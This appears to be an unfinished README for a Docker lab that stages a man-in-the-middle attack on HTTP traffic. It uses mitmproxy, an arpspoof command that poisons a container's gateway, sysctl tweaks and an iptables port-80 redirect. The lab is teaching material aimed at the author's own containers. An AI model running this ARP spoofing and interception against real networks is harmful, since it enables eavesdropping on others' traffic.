
# ManInTheMiddle attack on HTTP Lab in Docker.

- Builds on the previous Lab
- Leverage https://mitmproxy.org/
-

## Buid
  
```
sudo docker build --tag=mitm --build-arg http_proxy=$http_proxy --build-arg https_proxy=https_proxy  mitm
```

## Run

Launch 3 terminals:
```
gnome-terminal --title='Box1' -- sudo docker run -it --rm --name box1 busybox
gnome-terminal --title='MITM' -- sudo docker run -it --rm --name attacker mitm
gnome-terminal --title='TcpDumper'  -- sudo docker run -it --rm  --net=container:attacker --name tcpdumper tcpdumper
```

On the Attacker box, spoof the local gateway: `/usr/sbin/arpspoof -i eth0 -t 172.17.0.2 172.17.0.1 > /dev/null 2>&1 &`


Could get rid of the ICMP redirects by setting the host's send_redirects. They are somehow transmitted to the veth when it is created by Docker.
```
sudo sysctl net.ipv4.conf.all.send_redirects=0
sudo sysctl net.ipv4.conf.default.send_redirects=0
```
Can check in the container with 
```
for i in /proc/sys/net/ipv4/conf/* ; do           
  echo -n "$i " ; cat $i/send_redirects ;
done
```


Trying to use IPTables on veth no packets are impacted, but it works on the bridge:
`sudo iptables -t nat -A PREROUTING -i docker0 -p tcp --dport 80 -j REDIRECT --to-port 8080` 
problem now is that the spoofing is ignored. Packets go to the real server.

TBD

